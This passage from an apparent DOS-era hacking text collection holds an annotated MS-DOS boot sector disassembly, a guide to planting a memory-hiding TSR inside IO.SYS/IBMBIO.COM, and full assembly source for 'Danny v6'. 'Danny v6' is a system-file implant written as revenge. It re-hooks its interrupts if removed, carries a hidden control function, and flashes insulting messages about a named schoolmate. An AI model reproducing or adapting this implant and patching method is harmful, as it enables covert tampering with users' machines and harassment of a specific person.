+0000:7D05 8B471A        MOV     AX,[BX+1A]	;Get cluster number of IO.SYS
+0000:7D08 48            DEC     AX
+0000:7D09 48            DEC     AX		;Normalize (first cluster
+						;number is 2)
+0000:7D0A 8A1E0D7C      MOV     BL,[7C0D]	;Get sectors/cluster
+0000:7D0E 32FF          XOR     BH,BH		;Calculate sector offset of
+0000:7D10 F7E3          MUL     BX		;file into data area
+0000:7D12 0306497C      ADD     AX,[7C49]	;Add sector offset of file to
+0000:7D16 13164B7C      ADC     DX,[7C4B]	;sector offset of data area
+0000:7D1A BB0007        MOV     BX,0700		;Offset to read data 0000:0700
+0000:7D1D B90300        MOV     CX,0003		;3 sectors
+0000:7D20 50            PUSH    AX
+0000:7D21 52            PUSH    DX
+0000:7D22 51            PUSH    CX		;Save registers
+0000:7D23 E83A00        CALL    7D60		;Call PhysicalTranslation
+0000:7D26 72D8          JB      7D00		;If error, goto
+						;prenonsystemdisk
+0000:7D28 B001          MOV     AL,01		;1 sector
+0000:7D2A E85400        CALL    7D81		;Call ReadData (IO.SYS)
+0000:7D2D 59            POP     CX
+0000:7D2E 5A            POP     DX
+0000:7D2F 58            POP     AX		;Restore registers
+0000:7D30 72BB          JB      7CED		;If error reading, goto
+						;nonsystemdisk
+0000:7D32 050100        ADD     AX,0001		;Increment logical sector #
+0000:7D35 83D200        ADC     DX,+00
+0000:7D38 031E0B7C      ADD     BX,[7C0B]	;Add sector size to load
+						;offset
+0000:7D3C E2E2          LOOP    7D20		;Loop if more sectors
+0000:7D3E 8A2E157C      MOV     CH,[7C15]	;CH = Media descriptor byte
+0000:7D42 8A16247C      MOV     DL,[7C24]	;DL = Physical drive number
+0000:7D46 8B1E497C      MOV     BX,[7C49]
+0000:7D4A A14B7C        MOV     AX,[7C4B]	;BX:AX = sector offset to data
+						;area
+0000:7D4D EA00007000    JMP     0070:0000	;Jump to start of IO.SYS
+
+ShowMessage:
+0000:7D52 AC            LODSB			;Read a character
+0000:7D53 0AC0          OR      AL,AL		;If end of string marker (0),
+0000:7D55 7429          JZ      7D80		;goto returninstruction
+0000:7D57 B40E          MOV     AH,0E		;Subfunction 0Eh (teletype)
+0000:7D59 BB0700        MOV     BX,0007		;Set page and color
+0000:7D5C CD10          INT     10		;Show character
+0000:7D5E EBF2          JMP     7D52		;Goto ShowMessage
+
+PhysicalTranslation:
+0000:7D60 3B16187C      CMP     DX,[7C18]	;Is high word smaller than
+						;divisor?
+0000:7D64 7319          JNB     7D7F		;If not, goto returnerror
+						;because a divide-by-zero
+						;interrupt will occur when
+						;dividing
+0000:7D66 F736187C      DIV     WORD PTR [7C18]	;Divide sector offset by
+						;sectors/track to get sector #
+0000:7D6A FEC2          INC     DL		;Increment to make it a BIOS
+						;sector #
+0000:7D6C 88164F7C      MOV     [7C4F],DL	;Save it for ReadData
+0000:7D70 33D2          XOR     DX,DX		;Zero DX for division
+0000:7D72 F7361A7C      DIV     WORD PTR [7C1A]	;Divide tracks by # heads...
+0000:7D76 8816257C      MOV     [7C25],DL	;...so DL = head number (it's
+						;saved here because previous
+						;byte is drive number)...
+0000:7D7A A34D7C        MOV     [7C4D],AX	;...and AX = track number
+0000:7D7D F8            CLC			;Clear carry flag (no error)
+0000:7D7E C3            RET			;Return
+returnerror:
+0000:7D7F F9            STC			;Set carry flag (error)
+returninstruction:
+0000:7D80 C3            RET			;Return
+
+ReadData:
+0000:7D81 B402          MOV     AH,02		;Set function 2 (read sectors)
+0000:7D83 8B164D7C      MOV     DX,[7C4D]	;Get track #
+0000:7D87 B106          MOV     CL,06
+0000:7D89 D2E6          SHL     DH,CL		;Move bits 8-9 to top of word
+0000:7D8B 0A364F7C      OR      DH,[7C4F]	;OR in sector number
+						;(lower 6 bits); final result
+						;is that lower 8 bits of track
+						;number are in DL, and DH
+						;contains the sector number in
+						;the lower 6 bits, and bits 8
+						;and 9 of the track number in
+						;the two high bits
+0000:7D8F 8BCA          MOV     CX,DX		;Move it to CX
+0000:7D91 86E9          XCHG    CH,CL		;Swap the bytes for use with
+						;int 13h
+0000:7D93 8A16247C      MOV     DL,[7C24]	;Get drive number
+0000:7D97 8A36257C      MOV     DH,[7C25]	;Get head number
+						;Those two instructions could
+						;have been combined; I don't
+						;know why they aren't (to take
+						;up space...?)
+0000:7D9B CD13          INT     13		;Read the data
+0000:7D9D C3            RET			;Return; carry flag set by
+						;int 13h
+
+Jump instruction
+0000:7C00  EB 3C 90                                          .<.
+
+Boot sector data
+0000:7C03           4D 53 44 4F 53-35 2E 30 00 02 08 01 00      MSDOS5.0.....
+0000:7C10  02 00 02 00 00 F8 CB 00-26 00 10 00 26 00 00 00   ........&...&...
+0000:7C20  9A 53 06 00 80 00 29 F7-0D 64 21 4E 4F 20 4E 41   .S....)..d!NO NA
+0000:7C30  4D 45 20 20 20 20 46 41-54 31 36 20 20 20         ME    FAT16
+
+Real start of boot program
+0000:7C3E                                            FA 33                 .3
+0000:7C40  C0 8E D0 BC 00 7C 16 07-BB 78 00 36 C5 37 1E 56   .....|...x.6.7.V
+0000:7C50  16 53 BF 3E 7C B9 0B 00-FC F3 A4 06 1F C6 45 FE   .S.>|.........E.
+0000:7C60  0F 8B 0E 18 7C 88 4D F9-89 47 02 C7 07 3E 7C FB   ....|.M..G...>|.
+0000:7C70  CD 13 72 79 33 C0 39 06-13 7C 74 08 8B 0E 13 7C   ..ry3.9..|t....|
+0000:7C80  89 0E 20 7C A0 10 7C F7-26 16 7C 03 06 1C 7C 13   .. |..|.&.|...|.
+0000:7C90  16 1E 7C 03 06 0E 7C 83-D2 00 A3 50 7C 89 16 52   ..|...|....P|..R
+0000:7CA0  7C A3 49 7C 89 16 4B 7C-B8 20 00 F7 26 11 7C 8B   |.I|..K|. ..&.|.
+0000:7CB0  1E 0B 7C 03 C3 48 F7 F3-01 06 49 7C 83 16 4B 7C   ..|..H....I|..K|
+0000:7CC0  00 BB 00 05 8B 16 52 7C-A1 50 7C E8 92 00 72 1D   ......R|.P|...r.
+0000:7CD0  B0 01 E8 AC 00 72 16 8B-FB B9 0B 00 BE E6 7D F3   .....r........}.
+0000:7CE0  A6 75 0A 8D 7F 20 B9 0B-00 F3 A6 74 18 BE 9E 7D   .u... .....t...}
+0000:7CF0  E8 5F 00 33 C0 CD 16 5E-1F 8F 04 8F 44 02 CD 19   ._.3...^....D...
+0000:7D00  58 58 58 EB E8 8B 47 1A-48 48 8A 1E 0D 7C 32 FF   XXX...G.HH...|2.
+0000:7D10  F7 E3 03 06 49 7C 13 16-4B 7C BB 00 07 B9 03 00   ....I|..K|......
+0000:7D20  50 52 51 E8 3A 00 72 D8-B0 01 E8 54 00 59 5A 58   PRQ.:.r....T.YZX
+0000:7D30  72 BB 05 01 00 83 D2 00-03 1E 0B 7C E2 E2 8A 2E   r..........|....
+0000:7D40  15 7C 8A 16 24 7C 8B 1E-49 7C A1 4B 7C EA 00 00   .|..$|..I|.K|...
+0000:7D50  70 00                                             p.
+
+ShowMessage
+0000:7D52        AC 0A C0 74 29 B4-0E BB 07 00 CD 10 EB F2     ...t).........
+
+PhysicalTranslation
+0000:7D60  3B 16 18 7C 73 19 F7 36-18 7C FE C2 88 16 4F 7C   ;..|s..6.|....O|
+0000:7D70  33 D2 F7 36 1A 7C 88 16-25 7C A3 4D 7C F8 C3 F9   3..6.|..%|.M|...
+0000:7D80  C3                                                .
+
+ReadData
+0000:7D81     B4 02 8B 16 4D 7C B1-06 D2 E6 0A 36 4F 7C 8B    ....M|.....6O|.
+0000:7D90  CA 86 E9 8A 16 24 7C 8A-36 25 7C CD 13 C3         .....$|.6%|...
+
+"Non-System..." message
+0000:7D9E                                            0D 0A                 ..
+0000:7DA0  4E 6F 6E 2D 53 79 73 74-65 6D 20 64 69 73 6B 20   Non-System disk
+0000:7DB0  6F 72 20 64 69 73 6B 20-65 72 72 6F 72 0D 0A 52   or disk error..R
+0000:7DC0  65 70 6C 61 63 65 20 61-6E 64 20 70 72 65 73 73   eplace and press
+0000:7DD0  20 61 6E 79 20 6B 65 79-20 77 68 65 6E 20 72 65    any key when re
+0000:7DE0  61 64 79 0D 0A 00                                 ady...
+
+First filename (IO.SYS)
+0000:7DE6                    49 4F-20 20 20 20 20 20 53 59         IO      SY
+0000:7DF0  53                                                S
+
+Second filename (MSDOS.SYS)
+0000:7DF1     4D 53 44 4F 53 20 20-20 53 59 53 00 00          MSDOS   SYS..
+
+Valid boot record signature
+0000:7DFE                                            55 AA                 U.
+
+------------------------------------------------------------------------------
+
+Planting a TSR in a system file						  #009
+-------------------------------
+
+
+> How IO.SYS (or IBMBIO.COM) is loaded <
+
+From what I have seen, IO.SYS is loaded at 0070:0000, and execution begins at
+that address.  Usually just the first three sectors are loaded, and these
+eventually load the rest of IO.SYS.  When I booted from diskette, the register
+setup on execution I obtained (remember, not necessarily true for everyone)
+was as follows.
+
+AX = 0000  BX = 0021  CX = F000  DX = 0000
+SI = 7DFC  DI = 052B  BP = 0000  Flags = 0206
+DS = 0000  ES = 0000  SS = 0000  SP = 7BF8
+CS = 0070  IP = 0000
+
+Notice that SS:SP = 0000:7BF8.  The boot record in article 008 pushed the
+original int 1Eh vector and its address in the interrupt table onto the stack,
+for a total of 8 bytes.  The boot sector sets SS:SP to 0000:7C00, thus the
+current SS:SP is obtained by 0000:7C00 - 8 = 0000:7BF8).
+
+> How to plant the TSR <
+
+The method I usually use is based on the fact that IO.SYS contains a blank
+area of about 10Bh bytes at offset 0005.  The first instruction at offset 0000
+is usually a near jmp to offset 0138.  The first step is to change the
+destination of this jmp to your TSR at 0005.  When the TSR has finished
+loading, the program should restore the original bytes and JMP back to offset
+0000.  An alternative I have not yet tried but that might work would be to
+simply JMP to offset 0138 when done without restoring the original JMP.  What
+if the TSR is too big to fit in this area?  In article 00A, I modify the boot
+sector to load 5 sectors instead of 3, which is enough to cover a second large
+block of 00's.  This one is 200h bytes and located at offset 06F4.  The TSR
+would load up one block, and then append the second block.
+Another approach I have considered is having the TSR appended to IO.SYS, and
+have a loader read this into memory.  The drawback is that IO.SYS might be
+fragmented, which means that the end of IO.SYS may not be in the expected
+sector.
+
+> Going TSR before DOS loads <
+
+Because DOS hasn't loaded yet, there are no MCBs or other type of memory
+management (that's DOS's job).  However, there is a byte in the BIOS data
+segment at 0040:0013 that contains the number of kilobytes in conventional
+memory.  This can be decremented, so that DOS and BIOS will think that there
+is one less kilobyte of memory.  The TSR can be loaded into this
+"non-existent" piece of memory.  The one drawback is that MEM will show this.
+I have experimented with adding the additional kilobyte back once DOS has
+finished loading, but DOS kept crashing after CONFIG.SYS had been processed.
+Maybe the TSR didn't wait long enough before adding the kilobyte back; I plan
+on experimenting with this some other time.  The technique I used was to wait
+for two changes in the int 21h vector.  The first change is when it points to
+MSDOS.SYS at the top of memory.  The second change is when MSDOS.SYS is
+relocated lower in memory.
+When moving the TSR into the memory block that has been "allocated", remember
+that if the loader must store some data in the TSR, it must store the data
+before copying it, or it must change the data in the TSR's block if it has
+already been copied.  Also remember that hooking DOS interrupts this early is
+pointless because DOS isn't around (duh).  Also, even though a kilobyte is
+usually enough, you can allocate more if necessary.
+
+------------------------------------------------------------------------------
+
+Danny v6: An example of a TSR loaded from IBMBIO.COM			  #00A
+----------------------------------------------------
+
+
+> What it does <
+
+This program was written as a bit of revenge for an acquaintance at school.
+It may end up being a precursor for something much more complex, but that
+remains to be seen.  Anyway, this is version 6 of the program.  It will
+periodically display a message about Danny using the BIOS teletype
+subfunction, 0Eh.  It started out as a simple TSR.  Version 6 is adapted for
+use in IBMBIO.COM (or IO.SYS), rehooks itself to int 1Ch if it has been
+unhooked, is more flexible about where it displays the message on screen, and
+has a subfunction under int 16h (AX = D00Dh BX = ABCDh, CX = num) that allows
+you to specify a delay of 1-65,536 ticks so that the TSR can wait up to an
+hour before it displays the first message.  Overall, this is the most complex
+TSR I've planted in a system file.  Because the program is 753 bytes, it must
+be distributed over two blank areas in IBMBIO.COM.  The boot sector must also
+be modified to load five sectors of IO.SYS instead of three so that the second
+area is loaded.
+
+> How Danny v6 is "installed" <
+
+The first 10Bh bytes are placed at offset 0005 in IO.SYS.  The remaining bytes
+(up to 200h) are placed at offset 06F4.  This makes the maximum program size
+30Bh or 779 bytes.  The near JMP at offset 0000 is originally a JMP 0138
+(relative offset 0135).  This must be replaced with a JMP 0005 (relative
+offset 0002).  If the loader jumps back to offset 0000 to run the original
+IBMBIO.COM, then the original JMP must be restored when the loader is done.
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.286
+code	segment byte public
+	assume cs:code, ds:code
+	org	5			;This is the offset of the TSR in
+					;IBMBIO.COM
+
+howmany = 7				;Number of messages
+basesec = 3 * 60			;Minimum number of seconds for delay
+rangesec = 4 * 60			;Range of seconds in delay
+baseticks = basesec * 91 / 5		;Translate basesec to timer ticks
+rangeticks = rangesec * 91 / 5		;Translate rangsec to timer ticks
+rangerow = 25				;Maximum rows
+magicword = 0135h			;Original JMP relative offset
+firststart = 5				;Offset of first block of code
+firstamt = 10bh				;Length of first block of code
+secondstart = 6f4h			;Offset of second block of code
+secondamt = 200h			;Length of second block of code
+
+
+start:
+	pusha
+	push	ds
+	push	es			;Save registers
+	push	cs
+	pop	ds
+	push	cs
+	pop	es			;DS= ES = CS
+	call	InitRandomSeedFromTimer2	;Init random # generator
+	call	GetRandomNumber2	;Get random num -> BX
+	mov	ax, bx
+	xor	dx, dx
+	mov	bx, rangeticks
+	div	bx			;Get rnd# < rangeticks
+	add	dx, baseticks		;Add baseticks to previous number
+	mov	[timing], dx		;This is the delay before displaying
+					;a message
+	cld
+	xor	ax, ax
+	mov	ds, ax
+	mov	si, 1ch * 4
+	mov	di, offset oldint
+	cli
+	movsw
+	movsw				;Save original int 1Ch
+	mov	si, 16h * 4
+	movsw
+	movsw				;Save original int 16h
+	dec	word ptr ds:[413h]	;Decrement memory size
+	mov	ax, ds:[413h]
+	mov	dx, 40h
+	mul	dx
+	mov	es, ax			;Get the segment # of what BIOS (and
+					;DOS) thinks is the end of memory
+	mov	ds:[1ch * 4], offset tsr
+	mov	ds:[1ch * 4 + 2], es	;Hook TSR to int 1Ch
+	mov	ds:[16h * 4], offset insurance
+	mov	ds:[16h * 4 + 2], es	;Hook TSR to int 16h
+	mov	ax, ds:[46ch]
+	mov	cs:[lastcount], ax	;Save timer count
+	push	cs
+	pop	ds
+	mov	si, firststart
+	mov	di, si
+	mov	cx, firstamt
+	cld
+	rep	movsb			;Copy first code block
+	mov	si, secondstart
+	mov	cx, secondamt
+	push	cx
+	push	si
+	rep	movsb			;Copy second code block
+	mov	al, 0
+	push	cs
+	pop	es
+	pop	di
+	pop	cx
+	rep	stosb			;Zero out second block; unnecessary
+	sti				;because sector 5 not normally loaded;
+					;I would remove this in any future
+					;versions.
+	mov	word ptr cs:[1], magicword	;Restore old jmp
+	pop	es
+	pop	ds
+	popa
+	jmp	segstart		;JMP to start of IBMBIO.COM
+
+
+InitRandomSeedFromTimer2 Proc Near	;Init random number generator
+	push    ax
+	push    cx
+	push    dx
+	xor     ah, ah
+	int     1ah
+	mov     cs:[seedhigh], cx
+	mov     cs:[seedlow], dx
+	pop     dx
+	pop     cx
+	pop     ax
+	retn
+InitRandomSeedFromTimer2 endp
+
+
+;returns bx
+GetRandomNumber2 Proc Near		;Random number generator
+	push    ds			;This is the generator I use whenever
+	push    ax			;I need random numbers
+	push    cx
+	mov     ax, cs
+	mov     ds, ax
+	mov     ax, [seedhigh]
+	mov     bx, [seedlow]
+	not     ax
+	not     bx
+	ror     ax, 2
+	rol     bx, 1
+
+	xor     ax, [seedlow]
+	xor     bx, [seedhigh]
+
+	mov     cx, [counter]
+	ror     cx, cl
+	xor     cx, [counter]
+
+	adc     ax, cx
+	rol     bx, cl
+	mov     [seedhigh], ax
+	mov     [seedlow], bx
+	inc     word ptr [counter]
+	pop     cx
+	pop     ax
+	pop     ds
+	retn
+GetRandomNumber2 endp
+
+seedhigh        dw      0		;This is data for the generator
+seedlow         dw      0
+counter         dw      0
+
+
+thedata:
+	oldint	dw 0, 0			;Original int 1Ch vector
+	oldint16	dw 0, 0		;Original int 16h vector
+	timing	dw 0			;Delay before displaying a message
+	alive	db 0			;This flag is set every time int 1Ch
+					;is executed, to show that it the
+					;handler has not been disconnected
+	lastcount	dw 0		;Last timer tick count for insurance
+
+	;***** The messages *****
+msg01	db ' Danny is not lazy '
+msg02	db ' Danny is a wuss '
+msg03	db ' Watch your back Danny because Jessica is plotting your demise '
+msg04	db ' Danny is a loser '
+msg05	db ' Danny hides behind bureaucracies '
+msg06	db ' Danny aspires to be a cog in a wheel '
+msg07	db ' Danny will meet his doom at the hands of a skinny brunette '
+	db 'chick '
+lastone:
+
+	;***** This is a table of offsets of the messages *****
+ostable	dw offset msg01, offset msg02, offset msg03, offset msg04
+	dw offset msg05, offset msg06, offset msg07
+
+	;***** This is a table of lengths of the messages *****
+ltable	db offset msg02 - offset msg01, offset msg03 - offset msg02
+	db offset msg04 - offset msg03, offset msg05 - offset msg04
+	db offset msg06 - offset msg05, offset msg07 - offset msg06
+	db offset lastone - offset msg07
+
+ss_continuechain:
+	jmp	continuechain		;JNZ below can't reach continuechain
+
+tsr:
+	mov	byte ptr cs:[alive], 1	;Signal int 1Ch has been executed
+	dec	word ptr cs:[timing]	;Decrement delay count
+	jnz	ss_continuechain	;If not 0, continue int 1Ch chain
+	pusha
+	push	ds			;Save registers
+	mov	ah, 3
+	mov	bh, 0			;Assumes page #0
+	int	10h			;Get cursor position
+	push	dx			;Save it (could be improved to detect
+					;the current page number)
+	call	GetRandomNumber2
+	mov	ax, bx
+	xor	dx, dx
+	mov	bx, howmany
+	div	bx			;Pick a message
+	mov	bx, dx
+	push	bx			;Save it
+	push	cs
+	pop	ds			;DS = CS
+	mov	ch, [bx + offset ltable]
+	call	GetRandomNumber2
+	mov	ax, bx
+	xor	dx, dx
+	mov	bx, rangerow
+	div	bx			;Get a row < rangerow
+	mov	cl, dl
+	call	GetRandomNumber2
+	mov	ax, bx
+	xor	dx, dx
+	mov	bx, 80
+	sub	bl, ch
+	div	bx			;Get a column < (80 - message length)
+	mov	dh, cl
+	mov	ah, 2
+	mov	bh, 0
+	int	10h			;Set cursor position
+	pop	bx			;Restore message # -> BX
+	shl	bx, 1
+	add	bx, offset ostable
+	mov	si, [bx]		;Get message offset
+	cld
+	mov	ah, 0eh			;BIOS teletype subfunction
+	call	GetRandomNumber2
+	and	bx, 0fh			;Random color # (0 - 15)
+	mov	cl, 6ah			;Original decryption byte
+looper:
+	lodsb				;Get a character from the message
+	xor	al, cl			;Decrypt byte
+	int	10h			;Display byte
+	add	cl, 0cbh		;Update decryptor
+	dec	ch
+	jnz	looper			;Loop for next character
+	mov	ah, 2
+	mov	bh, 0
+	pop	dx			;Restore old cursor position
+	int	10h			;Do it
+	call	GetRandomNumber2
+	mov	ax, bx
+	xor	dx, dx
+	mov	bx, rangeticks
+	div	bx			;Get rnd# < rangeticks
+	add	dx, baseticks		;Add baseticks
+	mov	cs:[timing], dx		;Save delay amount in ticks
+	pop	ds
+	popa				;Restore registers
+continuechain:
+	jmp	dword ptr cs:[oldint]	;Continue int 1Ch chain
+
+insurance:
+	pushf
+	cli
+	push	ds
+	push	ax			;Save registers
+	cmp	ax, 0d00dh
+	jne	checkcount		;Check for timer set function
+	cmp	bx, 0abcdh
+	jne	checkcount		;Check for timer set function
+	mov	cs:[timing], cx		;Set timer delay
+	jmp	short exitinsurance
+
+checkcount:
+	xor	ax, ax
+	mov	ds, ax
+	mov	ax, ds:[46ch]		;Get timer tick count
+	sub	ax, cs:[lastcount]	;Get difference between last insurance
+					;check and current count
+	add	ax, 18
+	cmp	ax, 18 * 2
+	jbe	exitinsurance		;If difference <= 18, exit insurance
+checkalive:
+	mov	ax, ds:[46ch]		;Get timer count...
+	mov	cs:[lastcount], ax	;...and save it for next time
+	cmp	byte ptr cs:[alive], 1	;Check if int 1Ch hook alive
+	mov	byte ptr cs:[alive], 0	;Reset alive flag
+	je	exitinsurance		;If alive, then exit insurance
+	mov	ax, offset tsr
+	xchg	ax, ds:[1ch * 4]
+	mov	cs:[oldint], ax		;Save old int 1Ch vector and hook it
+	mov	ax, cs			;because TSR's int 1Ch hook is
+	xchg	ax, ds:[1ch * 4 + 2]	;inactive
+	mov	cs:[offset oldint + 2], ax
+exitinsurance:
+	sti
+	pop	ax
+	pop	ds
+	popf				;Restore registers
+	jmp	dword ptr cs:[oldint16]	;Continue int 16h chain
+
+
+theend:
+
+org 0					;Not actual code; just used to encode
+segstart:				;jump to start of IBMBIO.COM
+
+code	ends
+
+end	start
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
